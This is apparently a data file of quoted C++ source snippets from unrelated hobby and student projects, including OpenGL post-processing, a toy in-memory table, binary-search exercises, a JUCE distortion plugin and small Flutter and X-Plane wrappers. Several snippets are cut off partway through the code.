    "\ufeff#include \"BOX.h\"\n#include \"auxiliar.h\"\n#include \"PLANE.h\"\n\n#include <gl/glew.h>\n#define SOLVE_FGLUT_WARNING\n#include <gl/freeglut.h> \n\n#define GLM_FORCE_RADIANS\n#include <glm/glm.hpp>\n#include <glm/gtc/matrix_transform.hpp>\n\n#include <iostream>\n#include <cstdlib>\n\n#define RAND_SEED 31415926\n#define SCREEN_SIZE 500,500\n\n//////////////////////////////////////////////////////////////\n// Datos que se almacenan en la memoria de la CPU\n//////////////////////////////////////////////////////////////\n\n//Matrices\nglm::mat4\tproj = glm::mat4(1.0f);\nglm::mat4\tview = glm::mat4(1.0f);\nglm::mat4\tmodel = glm::mat4(1.0f);\n\n//Ejercicio 1\n//Motion Blur\nfloat alpha = 0.9f;\n//Ejercicio 2\n//DOF\nfloat focalDistance = -25.0f;\nfloat maxDistanceFactor = 1.0f / 5.0f;\n//Ejercicio 4\n//M\u00e1scaras de convoluci\u00f3n\nglm::vec2 texIdx[25] = {\n   glm::vec2(-2.0, 2.0), glm::vec2(-1.0, 2.0), glm::vec2(0.0, 2.0), glm::vec2(1.0, 2.0), glm::vec2(2.0, 2.0),\n   glm::vec2(-2.0, 1.0), glm::vec2(-1.0, 1.0), glm::vec2(0.0, 1.0), glm::vec2(1.0, 1.0), glm::vec2(2.0, 1.0),\n   glm::vec2(-2.0, 0.0), glm::vec2(-1.0, 0.0), glm::vec2(0.0, 0.0), glm::vec2(1.0, 0.0), glm::vec2(2.0, 0.0),\n   glm::vec2(-2.0, -1.0),glm::vec2(-1.0, -1.0), glm::vec2(0.0, -1.0), glm::vec2(1.0, -1.0), glm::vec2(2.0, -1.0),\n   glm::vec2(-2.0, -2.0),glm::vec2(-1.0, -2.0), glm::vec2(0.0, -2.0), glm::vec2(1.0, -2.0), glm::vec2(2.0, -2.0)\n};\n\nfloat maskFactor = float(1.0 / 65.0);\n\nfloat mask[25] = {\n   1.0 * maskFactor, 2.0 * maskFactor, 3.0 * maskFactor, 2.0 * maskFactor, 1.0 * maskFactor,\n   2.0 * maskFactor, 3.0 * maskFactor, 4.0 * maskFactor, 3.0 * maskFactor, 2.0 * maskFactor,\n   3.0 * maskFactor, 4.0 * maskFactor, 5.0 * maskFactor, 4.0 * maskFactor, 3.0 * maskFactor,\n   2.0 * maskFactor, 3.0 * maskFactor, 4.0 * maskFactor, 3.0 * maskFactor, 2.0 * maskFactor,\n   1.0 * maskFactor, 2.0 * maskFactor, 3.0 * maskFactor, 2.0 * maskFactor, 1.0 * maskFactor\n};\n\n\n\n//int mask = 0;\n\n//////////////////////////////////////////////////////////////\n// Variables que nos dan acceso a Objetos OpenGL\n//////////////////////////////////////////////////////////////\nfloat angle = 0.0f;\n\n//VAO\nunsigned int vao;\n\n//VBOs que forman parte del objeto\nunsigned int posVBO;\nunsigned int colorVBO;\nunsigned int normalVBO;\nunsigned int texCoordVBO;\nunsigned int triangleIndexVBO;\n\nunsigned int colorTexId;\nunsigned int emiTexId;\nunsigned int specularTexId;\n\n//Plano\nunsigned int planeVAO;\nunsigned int planeVertexVBO;\n\n//Por definir\nunsigned int vshader;\nunsigned int fshader;\nunsigned int program;\n\n//Variables Uniform \nint uModelViewMat;\nint uModelViewProjMat;\nint uNormalMat;\nint uTexIdx;\nint uMask;\nint uAlpha;\nint uFocalDistance;\nint uMaxDistanceFactor;\n\n//Texturas Uniform\nint uColorTex;\nint uEmiTex;\nint uSpecularTex;\nint uZettTex;\n\n//Atributos\nint inPos;\nint inColor;\nint inNormal;\nint inTexCoord;\n\n//Post-Processor\nunsigned int postProccesProgram;\nunsigned int postProccesVShader;\nunsigned int postProccesFShader;\n\n//Uniform\nunsigned int uColorTexPP;\n\n//Atributos\nint inPosPP;\n\n//FBO\nunsigned int fbo;\nunsigned int colorBuffTexId;\nunsigned int depthBuffTexId;\nunsigned int zTestBuffTexId;\nunsigned int postionBuffTexId;\nunsigned int normalBuffTexId;\nunsigned int emiBuffTexId;\nunsigned int specBuffTexId;\n\n\n//////////////////////////////////////////////////////////////\n// Funciones auxiliares\n//////////////////////////////////////////////////////////////\n\n//Declaraci\u00f3n de CB\nvoid renderFunc();\nvoid resizeFunc(int width, int height);\nvoid idleFunc();\nvoid keyboardFunc(unsigned char key, int x, int y);\nvoid mouseFunc(int button, int state, int x, int y);\n\nvoid renderCube();\n\nvoid resizeFBO(float width, float height);\n\n//Funciones de inicializaci\u00f3n y destrucci\u00f3n\nvoid initContext(int argc, char** argv);\nvoid initOGL();\nvoid initShaderFw(const char *vname, const char *fname);\nvoid initShaderPP(const char* vname, const char* fname);\nvoid initObj();\nvoid initPlane();\nvoid destroy();\n\n\n\n//Carga el shader indicado, devuele el ID del shader\n//!Por implementar\nGLuint loadShader(const char *fileName, GLenum type);\n\n//Crea una textura, la configura, la sube a OpenGL, \n//y devuelve el identificador de la textura \n//!!Por implementar\nunsigned int loadTex(const char *fileName);\n\n//////////////////////////////////////////////////////////////\n// Nuevas variables auxiliares\n//////////////////////////////////////////////////////////////\n\n\n//////////////////////////////////////////////////////////////\n// Nuevas funciones auxiliares\n//////////////////////////////////////////////////////////////\n//!!Por implementar\nvoid updateMask(unsigned int nMask);\n\n\n\nint main(int argc, char** argv)\n{\n\tstd::locale::global(std::locale(\"spanish\"));// acentos ;)\n\n\tinitContext(argc, argv);\n\tinitOGL();\n\tinitShaderFw(\"../shaders_P4/fwRendering.DeferredShading.vert\", \"../shaders_P4/fwRendering.DeferredShading.frag\");\n\tinitShaderPP(\"../shaders_P4/postProcessing.DeferredShading.vert\", \"../shaders_P4/postProcessing.DeferredShading.frag\");\n\t//initShaderFw(\"../shaders_P4/fwRendering",
    "// #include <bits/stdc++.h>\n#include <iostream>\n#include <vector>\n#include <cstring>\n#include <sstream>\n\n// using namespace std;\n\n// \u7c7b\u578b\u540d\u7528\u7684\u9a7c\u5cf0\n// \u53d8\u91cf\u540d/\u51fd\u6570\u540d\u7528\u7684\u4e0b\u5212\u7ebf\u5206\u9694\n// \u5b8f\u5b9a\u4e49\u7528\u5168\u5927\u5199 + \u4e0b\u5212\u7ebf\u5206\u9694\n\n#define ID_SIZE 4  // id\u5b57\u6bb5 4 byte\n#define USERNAME_SIZE 32 // username\u5b57\u6bb5 32 byte\n#define EMAIL_SIZE 256 // email\u5b57\u6bb5 256 byte\n#define ID_OFFSET 0 // id\u5b57\u6bb5\u8d77\u59cb\u504f\u79fb\n#define USERNAME_OFFSET ID_SIZE // Iusername\u5b57\u6bb5\u8d77\u59cb\u504f\u79fb\n#define EMAIL_OFFSET (ID_SIZE+USERNAME_SIZE) // email\u5b57\u6bb5\u8d77\u59cb\u504f\u79fb\n\n#define PAGE_SIZE 4096 // 4kB \u4e00\u9875\n#define ROW_SIZE (ID_SIZE+USERNAME_SIZE+EMAIL_SIZE) // 291 byte\n#define TABLE_MAX_PAGES 100 // \u6682\u65f6\u652f\u6301100\u9875\u5927\u5c0f\n#define PAGE_MAX_ROWS (PAGE_SIZE / ROW_SIZE) // \u4e00\u9875\u591a\u5c11\u884c 14\n#define TABLE_MAX_ROWS (TABLE_MAX_PAGES * PAGE_MAX_ROWS) // \u6574\u4e2atable\u652f\u6301\u7684\u603b\u884c\u6570\n\n// \u6807\u8bc6meta_cmd\u662f\u5426\u5408\u6cd5\ntypedef enum{\n  META_CMD_SUCCESS,\n  META_CMD_UNRECOGNIZED\n} MetaCmdResult;\n\n// \u6807\u8bc6statement\u662f\u5426\u5408\u6cd5\ntypedef enum{\n  PREPARE_SUCCESS,\n  PREPARE_UNRECOGNIZED_STATEMENT,\n  PREPARE_SYNTAX_ERROR,\n  PREPARE_INVALID_ARGS\n} PrepareResult;\n\n// \u6807\u8bc6execute\u7684\u7ed3\u679c\ntypedef enum{\n  EXECUTE_SUCCESS,\n  EXECUTE_TABLE_FULL,\n  EXECUTE_UNRECOGNIZED_STATEMENT\n} ExecuteResult;\n\n// \u6807\u8bc6\u76ee\u524d\u652f\u6301\u7684\u5173\u952e\u5b57\ntypedef enum{\n  INSERT,\n  SELECT\n} StatementType;\n\n// \u884c\u6570\u636e\u7ed3\u6784\n// | id | username | email | \u7ed3\u6784\u7684\u5c0f\u578b\u6570\u636e\u5e93\nstruct Row{ // total 291 byte\n  int id;  // 4 byte\n  char username[USERNAME_SIZE]; // \u6700\u591a31\u5b57\u7b26\n  char email[EMAIL_SIZE];    // \u6700\u591a255\u5b57\u7b26\n};\n\nvoid print_row(Row* row) {\n  printf(\"(%d, %s, %s)\\n\", row->id, row->username, row->email);\n}\n\nstruct Table{\n  int num_rows;\n  void* pages[TABLE_MAX_PAGES];\n\n  Table(){\n    num_rows = 0;\n    for(int i=0;i<TABLE_MAX_PAGES;i++){\n      pages[i] = nullptr;\n    }\n  }\n};\n\n// \u8fd4\u56detable\u4e2d\u7b2cidx\u884c\u7684\u5f00\u59cb\u4f4d\u7f6e\nvoid* row_slot(Table* table, int idx){\n  int page_idx = idx / PAGE_MAX_ROWS;\n  void* page = table->pages[page_idx];\n  if(page == nullptr){\n    page = table->pages[page_idx] = new char[PAGE_SIZE];\n  }\n  int row_idx = idx % PAGE_MAX_ROWS;\n  void* ret = (char*)page + row_idx * ROW_SIZE;\n  return ret;\n}\n\n// \u628arow\u6307\u5411\u7684\u884c\u653e\u5230dest\u4f4d\u7f6e\nvoid put_row_to_table(Row* row, void* dest){\n  memcpy((char*)dest + ID_OFFSET, &(row->id), ID_SIZE);\n  memcpy((char*)dest + USERNAME_OFFSET, &(row->username), USERNAME_SIZE);\n  memcpy((char*)dest + EMAIL_OFFSET, &(row->email), EMAIL_SIZE);\n  return;\n}\n\n// \u53bb\u9664source\u4f4d\u7f6e\u7684\u4e00\u884c\u653e\u8fdbrow\u6307\u5411\u7684\u4f4d\u7f6e\nvoid get_row_from_table(Row* row, void* source){\n  memcpy(&(row->id), (char*)source + ID_OFFSET, ID_SIZE);\n  memcpy(&(row->username), (char*)source + USERNAME_OFFSET, USERNAME_SIZE);\n  memcpy(&(row->email), (char*)source + EMAIL_OFFSET, EMAIL_SIZE);\n  return;\n}\n\nstruct Statement{\n  StatementType type;\n  Row row_to_insert; // only use in insert statement\n};\n\n// \u5904\u7406 .\u5f00\u5934\u7684meta cmd \u8fd9\u4e9b\u90fd\u4e0d\u662fsql\u8bed\u53e5\n// \u76ee\u524d\u53ea\u80fd\u5904\u7406.exit\nMetaCmdResult do_meta_cmd(std::string meta_cmd){\n  if(meta_cmd == \".exit\") exit(0);\n  return META_CMD_UNRECOGNIZED;\n}\n\n// \u68c0\u67e5input_buffer\u662f\u5426\u662f\u5408\u6cd5\u7684statement \u5e76\u585e\u8fdbstatement\n// \u9700\u8981\u89e3\u6790input_buffer\u7684\u8bed\u6cd5\nPrepareResult prepare_statment(std::string input_buffer, Statement* statement){\n  const std::string insert_str = \"insert\";\n  const std::string select_str = \"select\";\n\n  // \u53c2\u6570\u89e3\u6790\u653e\u5916\u9762\n  std::istringstream iss(input_buffer);\n  std::vector<std::string> args;\n  std::string temp;\n  while(iss >> temp){\n    args.push_back(temp);\n  }\n\n  // \u76ee\u524d\u9002\u914d\u7684\u8bed\u6cd5\uff1a\n  // insert id(int) username(string) email(string)\n  if(args[0] == insert_str) {\n    if(args.size() != 4) return PREPARE_SYNTAX_ERROR;\n\n    // \u5904\u7406\u53c2\u6570\u8fc7\u957f\n    if(args[2].size() >= USERNAME_SIZE) return PREPARE_INVALID_ARGS;\n    if(args[3].size() >= EMAIL_SIZE) return PREPARE_INVALID_ARGS;\n\n    statement->type = INSERT;\n    try{ // \u5904\u7406args[1]\u4e0d\u53ef\u89e3\u6790\u4e3aint\u7684\u60c5\u51b5\n      statement->row_to_insert.id = stoi(args[1]);\n    }\n    catch (std::invalid_argument){\n      return PREPARE_SYNTAX_ERROR;\n    }\n    if(statement->row_to_insert.id < 0) return PREPARE_INVALID_ARGS;\n    strcpy(statement->row_to_insert.username, args[2].c_str());\n    strcpy(statement->row_to_insert.email, args[3].c_str());\n\n    return PREPARE_SUCCESS;\n  }\n  // \u76ee\u524d\u9002\u914d\u7684\u8bed\u6cd5\n  // select \n  else if(args[0] == select_str) {\n    if(args.size() != 1) return PREPARE_SYNTAX_ERROR;\n\n    statement->type = SELECT;\n\n    return PREPARE_SUCCESS;\n  }\n  return PREPARE_UNRECOGNIZED_STATEMENT;\n}\n\n// \u6267\u884cinsert\nExecuteResult execute_insert(Statement* statement, Table* table){\n  // \u63d2\u5165\u5224\u6ee1\n  if(table->num_rows >= TABLE_MAX_ROWS){\n    return EXECUTE_TABLE_FULL;\n  }\n      \n  Row* row_to_insert = &(statement->row_to_insert);\n  // \u628aarg0\u653e\u8fdbarg1\u8fd4\u56de\u7684\u4f4d\u7f6e\n\n  put_row_to_table(row_to_insert, row_slot(table, table->num_rows));\n\n  table->num_rows++;\n  return EXECUTE_SUCCESS;\n}\n\n// \u6267\u884cselect\nExecuteResult execute_select(Statement* statement, Table* table){\n  Row row_now;\n  std::cout << '\\n';\n  for(int i=0;i<table->num_rows;i++){\n    get_row_from_table(&row_now, row_slot(table, i));\n    print_row(&row_now);\n  }\n  return EXECUTE_SUCCESS;\n}\n\n// \u6267\u884cstatement\nExecuteResult execute_statment(Statement* statement, Table* table){\n  ExecuteResult res = EXECUTE_UNRECOGNIZED_STATEMENT;\n  switch (statement->type){\n    case (INSERT):{\n      res = execute_insert(statement, table);\n      break;\n    }\n    case (SELECT):{\n      res =",
    "#include <iostream>\n\n#include \"Caleb_Alg.h\"\n\nusing namespace std;\n\n/*this algorithm finds the most used move used by player2\nand uses the opposing move more often*/\n//NOTE: should include a percent chance of trying to anticipate\n//moves so that it is not constantly choosing the same one\n//when one move is used over and over on the other team\n\nCaleb_Alg::Caleb_Alg() {\n\n    srand(time(0));\n}\n\nchar Caleb_Alg::Algorithm1(char wtl[], char opp_array[], int rounds) {\n\n    int choice;\n    int rock = 0;\n    int paper = 0;\n    int scissors = 0;\n    char play2;\n\n    for (int i = 0; i < rounds; i++) {\n\n        play2 = opp_array[i];\n\n        if (play2 == 'r') {\n            rock++;\n        } else if (play2 == 'p') {\n            paper++;\n        } else if (play2 == 's') {\n            scissors++;\n        }\n    }\n\n    if (rock == 0 && paper == 0 && scissors == 0) {\n        return rand() % 3 + 1;\n    }\n\n    int num = rock;\n    for (int i = 0; i < rounds; i++) {\n        if (rock < paper) {\n            num = paper;\n        }\n        if (rock < scissors) {\n            num = scissors;\n        }\n        if (paper < scissors) {\n            num = scissors;\n        }\n\n    }\n    int num1;\n    if (num == rock) {\n        num1 = rand() % 5;\n        if (num1 >= 3) {\n            choice = 1;\n        } else {\n            choice = 2;\n        }\n    } else if (num == paper) {\n        num1 = rand() % 5;\n        if (num1 >= 3) {\n            choice = 2;\n        } else {\n            choice = 3;\n        }\n    } else if (num == scissors) {\n        num1 = rand() % 5;\n        if (num1 >= 3) {\n            choice = 3;\n        } else {\n            choice == 1;\n        }\n\n    }\n\n    cout << rock << endl << paper << endl << scissors << endl;\n    char play;\n    if (choice == 1) {\n        play = 'r';\n    } else if (choice == 2) {\n        play = 'p';\n    } else {\n        play = 's';\n    }\n\n    return play;\n}\n\nchar Caleb_Alg::Algorithm2(char wtl[], char opp_array[], int rounds) {\n    char play2;\n    int num;\n    num = rand() % 3 + 1;\n\n    if (num == 1) {\n        play2 = 'r';\n    } else if (num == 2) {\n        play2 = 'p';\n    } else {\n        play2 = 's';\n    }\n\n    return play2;\n\n}\n",
    "// w.a.p in binary searching????|\n// #include<iostream>\n// using namespace std;\n// int binarysearch(int size,int a[],int key)\n// {\n//     int start=0;\n//     int end=size-1;\n//     int mid=start+(end-start)/2;\n//     while(start<=end)\n//     {\n//         if(a[mid]==key)\n//         {\n//             return mid;\n//         }\n//         if(a[mid]>key)\n//         {\n//             end=mid-1;\n//         }\n//         else if(key>a[mid])\n//         {\n//             start=mid+1;\n//         }\n//         mid=start+(end-start)/2;\n//     }\n//     return -1;\n// }\n// int main()\n// {\n//     int a[6]={10,20,30,40,50,60};\n//     int key=20;\n//     cout<<binarysearch(6,a,20);\n//     return 0;\n// }\n\n\n\n// W.a.P find the first occurence number???\n// #include<iostream>\n// using namespace std;\n// int occurence(int size,int a[],int key)\n// {\n//     int start=0;\n//     int end=size-1;\n//     while(start<=end)\n//     {\n//         int mid=start+(end-start)/2;\n//         if(a[mid]<key)\n//         {\n//             start=mid+1;\n//         }\n//         else if(a[mid]>key)\n//         {\n//             end=mid-1;\n//         }\n//         else{\n//             if(a[mid]==0||a[mid-1]!=a[mid])\n//             {\n//                 return mid;\n//             }\n//             else{\n//                 end=mid-1;\n//             }\n//         }\n//     }\n//     return -1;\n\n// }\n// // int occurence(int size,int a[],int key)\n// // {\n// //     for(int i=0;i<size;i++)\n// //     {\n// //         if(a[i]==key)\n// //         {\n// //             return i;\n// //         }\n\n// //     }\n// //     return -1;\n// // }\n// int main()\n// {\n//     int a[7]={1,10,10,10,20,20,40};\n//     int size=7;\n//     int  key=20;\n//     cout<<occurence(size,a,key);\n//     return 0;\n// }\n\n\n// W.A.P in  find the last occurence number  ?????????//\n// #include<iostream>\n// using  namespace std;\n// int occurence(int size,int a[],int key)\n// {\n//     int start=0;\n//     int end=size-1;\n//     while(start<=end)\n//     {\n//         int mid=start+(end-start);\n//         if(a[mid]<key)\n//         {\n//             start=mid+1;\n//         }\n//         else if(a[mid]>key)\n//         {\n//             end=mid-1;\n//         }\n//         else{\n//             if(a[mid]==0||a[mid+1]!=a[mid])\n//             {\n//                 return mid;\n//             }\n//             else{\n//                 end=mid-1;\n//             }\n//         }\n//     }\n//     return -1;\n// }\n// // int occurence(int size,int a[],int key)\n// // {\n// //     int answer=0;\n// //     for(int i=0;size-1>i;i++);\n// //     {\n// //         if(a[size]==key)\n// //         {\n// //             return size-1;\n// //         }\n// //     }\n// //     return -1;\n// // }\n// int main()\n// {\n//     int a[7]={1,20,20,20,20,20,30};\n//     int  size=6;\n//     int key=20;\n//     cout<<occurence(size,a,key);\n//     return 0;\n// }\n\n\n\n// W.A.P in count the number occurence number??\n// #include<iostream>\n// using namespace std;\n// int firstoccurence(int size,int a[],int key)\n// {\n//     int start=0;\n//     int end=size-1;\n//     while(start<=end)\n//     {\n//         int mid=start+(end-start)/2;\n//         if(a[mid]<key)\n//         {\n//             start=mid+1;\n//         }\n//         else if(a[mid]>key)\n//         {\n//             end=mid-1;\n//         }\n//         else{\n//             if(a[mid]==0||a[mid-1]!=a[mid])\n//             {\n//                 return mid;\n//             }\n//             else{\n//                 end=mid-1;\n//             }\n//         }\n//     }\n//     return -1;\n// }\n// int lastoccurence(int size,int a[],int key)\n// {\n//     int start=0;\n//     int end=size-1;\n//     while(start<=end)\n//     {\n//         int mid=start+(end-start)/2;\n//         if(a[mid]<key)\n//         {\n//             start=mid+1;\n//         }\n//         else if(a[mid]>key)\n//         {\n//             end=mid-1;\n//         }\n//         else{\n//             if(a[mid]!=0||a[mid+1]!=a[mid])\n//             {\n//                 return mid;\n//             }\n//             else{\n//                 end=mid-1;\n//             }\n//         }\n//     }\n//     return -1;\n// }\n// int countoccurence(int size,int a[],int key)\n// {\n//     int fact=firstoccurence(size,a,key);\n//     if(fact==-1)\n//     {\n//         return 0;\n//     }\n//     else{\n//         return(lastoccurence(size,a,key)-fact+1);\n//     }\n// }\n// // int countoccurence(int size,int a[],int key)\n// // {\n// //     int count=0;\n// //     for(int i=0;i<size;i++)\n// //     {\n// //         if(a[i]==key)\n// //         {\n// //             count++;\n// //         }   \n// //     }\n// //     return count;\n// // }\n// int main()\n// {\n//     int a[8]={1,2,3,4,4,4,4,5};\n//     int size=8;\n//     int key=4;\n//     cout<<countoccurence(size,a, key);\n//     return 0;\n// }\n\n// BOTH ARE FIND OUCCURENCE TIME ?????????????????\n\n// #include<iostream>\n// using namespace std;\n// int lastoccurence(int size,int a[],int key)\n// {\n//     for(int i=0;size-1>i;i++)\n//     {\n//         if(a[size]==key)\n//         {\n//             return size-1;\n//      ",
    "/* ************************************************************************** */\n/*                                                                            */\n/*                                                        :::      ::::::::   */\n/*   Fixed.cpp                                          :+:      :+:    :+:   */\n/*                                                    +:+ +:+         +:+     */\n/*   By: kahmada <kahmada@student.42.fr>            +#+  +:+       +#+        */\n/*                                                +#+#+#+#+#+   +#+           */\n/*   Created: 2024/11/28 18:39:34 by kahmada           #+#    #+#             */\n/*   Updated: 2025/01/02 10:14:44 by kahmada          ###   ########.fr       */\n/*                                                                            */\n/* ************************************************************************** */\n\n#include \"Fixed.hpp\"\n\nFixed::Fixed(void)\n{\n    this->value = 0;\n    std::cout << \"Default constructor called\" << std::endl;\n}\n\nFixed::Fixed(const Fixed &ob)\n{\n    std::cout << \"Copy constructor called\" << std::endl;\n    *this = ob;\n}\n\nFixed& Fixed::operator=(const Fixed& ob)\n{\n    std::cout << \"Copy assignment operator called\" << std::endl;\n    this->value = ob.getRawBits();\n    return *this;\n}\n\nFixed::~Fixed()\n{\n    std::cout << \"Destructor called\" << std::endl;\n}\n\nint Fixed::getRawBits(void) const\n{\n    std::cout << \"getRawBits member function called\" << std::endl;\n    return value;\n}\n\nvoid Fixed::setRawBits(int const raw)\n{\n    value = raw;\n}\n",
    "#include \"PluginProcessor.h\"\n#include \"PluginEditor.h\"\n\nImperialTriodeOverlordAudioProcessor::ImperialTriodeOverlordAudioProcessor()\n#ifndef JucePlugin_PreferredChannelConfigurations\n  : AudioProcessor(BusesProperties()\n#if ! JucePlugin_IsMidiEffect\n#if ! JucePlugin_IsSynth\n    .withInput(\"Input\", juce::AudioChannelSet::stereo(), true)\n#endif\n    .withOutput(\"Output\", juce::AudioChannelSet::stereo(), true)\n#endif\n  ),\n  parameters(*this, nullptr, juce::Identifier(\"params\"),\n    {\n        std::make_unique<juce::AudioParameterFloat>(\"drive\", \"Drive\",  0.25f, 1.0f, 0.6f),\n        std::make_unique<juce::AudioParameterFloat>(\"mix\",   \"Mix\",    0.0f, 1.0f, 1.0f),\n        std::make_unique<juce::AudioParameterFloat>(\"bias\",  \"Bias\",   0.0f, 2.0f, 0.0f)\n    })\n#endif\n{\n  // Initialize smoothing, oversampling, etc. if needed\n  autoGainDb.setCurrentAndTargetValue(-12.0f);\n#if DEBUG \n  formatManager.registerBasicFormats();\n#endif\n}\n\nImperialTriodeOverlordAudioProcessor::~ImperialTriodeOverlordAudioProcessor() {}\n\nvoid ImperialTriodeOverlordAudioProcessor::prepareToPlay(double sampleRate, int samplesPerBlock)\n{\n  currentSampleRate = (float)sampleRate;\n\n#if DEBUG\n  transportSource.prepareToPlay(samplesPerBlock, sampleRate);\n#endif\n\n  // Setup process spec\n  juce::dsp::ProcessSpec spec;\n  spec.sampleRate = sampleRate;\n  spec.maximumBlockSize = (juce::uint32)samplesPerBlock;\n  spec.numChannels = (juce::uint32)getTotalNumOutputChannels();\n\n  // Prepare our engine & tone stack\n  distortionEngine.prepare(spec, 1); // 2x oversampling or whatever\n  distortionEngine.reset();\n\n  autoGainDb.reset(sampleRate, 0.001); // 1ms ramp, adjust as needed\n}\n\nvoid ImperialTriodeOverlordAudioProcessor::releaseResources()\n{\n  // Release anything needed\n}\n\nbool ImperialTriodeOverlordAudioProcessor::isBusesLayoutSupported(const BusesLayout& layouts) const\n{\n  if (layouts.getMainOutputChannelSet() != juce::AudioChannelSet::stereo())\n    return false;\n\n  if (layouts.getMainInputChannelSet() != juce::AudioChannelSet::stereo())\n    return false;\n\n  return true;\n}\n\nvoid ImperialTriodeOverlordAudioProcessor::processBlock(juce::AudioBuffer<float>& buffer,\n  juce::MidiBuffer& midiMessages)\n{\n  juce::ScopedNoDenormals noDenormals;\n\n#if DEBUG\n  // Fill the buffer from the transport source\n  transportSource.getNextAudioBlock(juce::AudioSourceChannelInfo(buffer));\n#endif\n\n  // 1) Check bypass\n  if (bypass)\n    return;\n\n  // 2) Pre RMS\n  PreCalcAutoGainRms(buffer);\n\n  // 3) Update DistortionEngine parameters\n  float drive = *parameters.getRawParameterValue(\"drive\");\n  float bias = *parameters.getRawParameterValue(\"bias\");\n  float mix = *parameters.getRawParameterValue(\"mix\");\n\n  distortionEngine.setDrive(drive);\n  distortionEngine.setBias(bias);\n  distortionEngine.setMix(mix);\n\n  // 4) Distortion\n  distortionEngine.processBlock(getSampleRate(), buffer);\n\n  // 5) Brickwall limit\n  brickwallLimit(buffer);\n\n  // 6) Post RMS + autogain\n  PostCalcAutoGainRms(buffer);\n}\n\nvoid ImperialTriodeOverlordAudioProcessor::brickwallLimit(juce::AudioBuffer<float>& buffer)\n{\n  auto numChannels = buffer.getNumChannels();\n  auto numSamples = buffer.getNumSamples();\n\n  for (int ch = 0; ch < numChannels; ++ch)\n  {\n    float* channelData = buffer.getWritePointer(ch);\n    for (int i = 0; i < numSamples; ++i)\n      channelData[i] = juce::jlimit(-1.0f, 1.0f, channelData[i]);\n  }\n}\n\nvoid ImperialTriodeOverlordAudioProcessor::PostCalcAutoGainRms(juce::AudioBuffer<float>& buffer)\n{\n  float sumOfSquaresOutput = 0.0f;\n  for (int ch = 0; ch < buffer.getNumChannels(); ++ch)\n  {\n    const float* readPtr = buffer.getReadPointer(ch);\n    for (int i = 0; i < buffer.getNumSamples(); ++i)\n    {\n      float sampleVal = readPtr[i];\n      sumOfSquaresOutput += sampleVal * sampleVal;\n    }\n  }\n  float meanSquareOutput = sumOfSquaresOutput / (buffer.getNumSamples() * buffer.getNumChannels());\n  lastOutputRms = std::sqrt(meanSquareOutput);\n\n  float threshold = 0.001f; // ~ -80 dB\n  if (lastInputRms > threshold)\n  {\n    float inputAmp = lastInputRms + 1e-12f;   // avoid /0\n    float outputAmp = lastOutputRms + 1e-12f;\n\n    float correctionDb = juce::Decibels::gainToDecibels(inputAmp / outputAmp);\n\n    autoGainDb.setTargetValue(correctionDb);\n  }\n\n  for (int sample = 0; sample < buffer.getNumSamples(); ++sample)\n  {\n    float currentDb = autoGainDb.getNextValue();\n    float currentLin = juce::Decibels::decibelsToGain(currentDb);\n\n    for (int ch = 0; ch < buffer.getNumChannels(); ++ch)\n    {\n      float* writePtr = buffer.getWritePointer(ch);\n      writePtr[sample] *= currentLin;\n    }\n  }\n}\n\nvoid ImperialTriodeOverlordAudioProcessor::PreCalcAutoGainRms(juce::AudioBuffer<float>& buffer)\n{\n  float sumOfSquaresInput = 0.0f;\n\n  for (int ch = 0; ch < buffer.getNumChannels(); ++ch)\n  {\n    const float* readPtr = buffer.getReadPointer(ch);\n    for (int i = 0; i < buffer.getNumSamples(); ++i)\n    {\n      float sampleVal = readPtr[i];\n      sumOfSquaresInput += sampleVal * sampleVal;\n    }\n  }\n  float meanSquare",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"cpu_temp_monitor_flutter\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"XPCWidget.h\"\n\nXPCWidget::XPCWidget(\n\t\tint\t\t\t\t\t\tinLeft,\n\t\tint\t\t\t\t\t\tinTop,\n\t\tint\t\t\t\t\t\tinRight,\n\t\tint\t\t\t\t\t\tinBottom,\n\t\tbool\t\t\t\t\tinVisible,\n\t\tconst char *\t\t\tinDescriptor,\n\t\tbool\t\t\t\t\tinIsRoot,\n\t\tXPWidgetID\t\t\t\tinParent,\n\t\tXPWidgetClass\t\t\tinClass) :\n\tmWidget(NULL),\n\tmOwnsChildren(false),\n\tmOwnsWidget(true)\n{\n\tmWidget = XPCreateWidget(\n\t\tinLeft, inTop, inRight, inBottom,\n\t\tinVisible ? 1 : 0,\n\t\tinDescriptor,\n\t\tinIsRoot ? 1 : 0,\n\t\tinIsRoot ? NULL : inParent,\n\t\tinClass);\n\n\tXPSetWidgetProperty(mWidget, xpProperty_Object, reinterpret_cast<intptr_t>(this));\t\t\n\tXPAddWidgetCallback(mWidget, WidgetCallback);\n}\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\nXPCWidget::XPCWidget(\n\tXPWidgetID\t\t\t\tinWidget,\n\tbool\t\t\t\t\tinOwnsWidget) :\n\tmWidget(inWidget),\n\tmOwnsChildren(false),\n\tmOwnsWidget(inOwnsWidget)\n{\n\tXPSetWidgetProperty(mWidget, xpProperty_Object, reinterpret_cast<intptr_t>(this));\t\t\n\tXPAddWidgetCallback(mWidget, WidgetCallback);\n}\n\nXPCWidget::~XPCWidget()\n{\n\tif (mOwnsWidget)\n\t\tXPDestroyWidget(mWidget, mOwnsChildren ? 1 : 0);\n}\n\t\nvoid\t\tXPCWidget::SetOwnsWidget(\n\t\t\t\t\tbool \t\t\t\t\tinOwnsWidget)\n{\n\tmOwnsWidget = 